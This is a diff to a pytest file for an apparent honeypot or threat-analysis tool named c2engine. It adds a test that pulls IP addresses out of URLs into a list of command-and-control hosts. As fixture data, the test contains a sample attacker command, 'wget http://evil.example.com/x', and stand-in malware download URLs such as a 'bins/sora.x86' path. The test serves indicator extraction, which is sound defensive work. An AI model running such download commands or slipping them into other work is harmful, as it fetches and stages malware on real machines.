@@ -7,6 +7,7 @@ from pathlib import Path
 
 import pytest
 
+from c2engine.analyze import iocs
 from c2engine.context import build_context
 from c2engine.pipeline.extract import all_observations
 from c2engine.model import SessionIn
@@ -27,6 +28,24 @@ def test_iocs_fields(raw: dict) -> None:
     # eTLD+1 grouping form on the soft field; full host on the pivot
     assert "example.com" in hp["iocs_domains"]
     assert hp["iocs_c2_hosts"] == ["59.96.137.61", "evil.example.com"]
+
+
+def test_url_host_ip_folds_into_c2_hosts() -> None:
+    """An IP that appears ONLY as a URL host — a sensor-recorded download URL,
+    or one hidden in a wrapper so it never appears as a bare token in the
+    command text — must still reach c2_hosts (and so a shell_reference ledger
+    row), not survive only in `urls`."""
+    b = iocs.extract(
+        "wget http://evil.example.com/x",                      # only a domain typed
+        existing_urls=["http://203.0.113.10/bins/sora.x86",    # IP only as URL host
+                       "http://198.51.100.55:8080/loader"],    # IP host with a port
+    )
+    assert "203.0.113.10" in b.ips and "203.0.113.10" in b.c2_hosts
+    assert "198.51.100.55" in b.ips and "198.51.100.55" in b.c2_hosts  # port stripped
+    # IPs must NOT be mis-filed as hostnames/domains (those stay the pivot-clean set)
+    assert not any(is_ip_str in b.hostnames for is_ip_str in ("203.0.113.10", "198.51.100.55"))
+    assert b.domains == ["example.com"]  # only the real domain groups
+    assert "evil.example.com" in b.c2_hosts
 
 
 def test_playbook_is_sha1_and_stable(raw: dict) -> None:
